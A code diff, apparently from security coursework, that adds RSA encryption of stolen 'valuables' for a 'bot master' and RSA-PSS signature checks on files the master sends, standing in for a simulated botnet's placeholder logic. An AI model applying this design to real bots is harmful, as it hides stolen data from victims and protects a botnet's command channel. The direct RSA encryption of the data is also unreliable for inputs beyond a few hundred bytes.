@@ -13,7 +13,12 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+
+    h=SHA.new(data)
+    key = RSA.importKey(open(os.path.join("PUBLIC_KEY", "master_public")).read())
+    cipher = PKCS1_v1_5.new(key)
+    ciphertext = cipher.encrypt(data+h.digest())
+    return ciphertext
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -34,9 +39,16 @@ def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
     # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
+
+    signature = f[:256]
+    message = f[256:]
+    key = RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
+
+    h = SHA.new()
+    h.update(message)
+    verifier = PKCS1_PSS.new(key)
+
+    if verifier.verify(h, signature):
         return True
     return False
 
